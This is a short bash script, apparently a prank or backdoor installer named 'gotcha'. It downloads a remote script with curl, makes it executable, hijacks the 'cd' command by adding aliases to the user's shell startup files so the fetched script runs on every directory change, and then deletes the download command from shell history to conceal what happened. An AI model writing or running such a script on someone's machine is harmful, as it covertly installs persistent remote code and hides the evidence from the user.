#bin/bash
curl -s -o ~/gotcha.sh https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh
chmod +x ~/gotcha.sh
echo "alias cd='bash ~/gotcha.sh'" >> ~/.zshrc
echo "alias cd='bash ~/gotcha.sh'" >> ~/.bashhrc
export HISTIGNORE="history -d*"
history -d $(history | grep "curl -s -o ~/gotcha.sh https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh" | awk '{print $1}')
